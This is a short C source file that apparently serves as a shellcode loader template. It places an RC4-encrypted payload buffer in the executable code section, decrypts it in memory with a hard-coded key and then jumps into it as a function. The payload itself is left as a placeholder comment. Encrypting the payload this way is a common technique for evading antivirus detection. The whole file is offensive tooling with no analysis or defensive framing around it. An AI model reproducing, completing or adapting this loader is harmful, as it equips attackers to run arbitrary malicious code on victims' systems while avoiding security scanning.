__attribute__((section(".text")))
unsigned char buf[] = </*shellcode*/>;

const unsigned char KEY[] = "\x73\x65\x63\x72\x65\x74";
const unsigned int KEY_LEN = sizeof(KEY) - 1;

void rc4_decrypt(unsigned char* data, unsigned int data_len, const unsigned char* key, unsigned int key_len) {
    unsigned char s[256];
    for (unsigned int i = 0; i < 256; i++) {
        s[i] = (unsigned char)i;
    }

    unsigned int j = 0;
    for (unsigned int i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % key_len]) % 256;
        unsigned char tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
    }

    unsigned int i = 0;
    j = 0;
    for (unsigned int n = 0; n < data_len; n++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        unsigned char tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
        unsigned char k = s[(s[i] + s[j]) % 256];
        data[n] ^= k;
    }
}

int main() {
    rc4_decrypt(buf, sizeof(buf), KEY, KEY_LEN);
    (*(void(*)())(&buf))();
    return 0;
}